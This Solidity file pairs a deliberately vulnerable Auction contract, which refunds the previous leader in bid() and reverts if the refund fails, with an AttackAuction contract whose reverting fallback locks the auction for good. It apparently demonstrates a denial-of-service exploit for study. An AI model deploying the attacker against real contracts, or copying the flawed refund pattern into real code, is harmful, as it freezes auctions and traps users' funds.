// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Auction {
    address public currentLeader;
    uint256 public highestBid;

    function bid() external payable {
        require(msg.value > highestBid, "Bid not high enough");
        
        (bool sent, ) = currentLeader.call{value: highestBid}("");
        require(sent, "Failed to send ETH");

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract AttackAuction {
    Auction public auction;
    
    constructor(address _auctionAddress) {
        auction = Auction(_auctionAddress);
    }
    
    fallback() external payable {
        revert("I won't accept ETH!");
    }
    
    function attack() external payable {
        auction.bid{value: msg.value}();
    }
}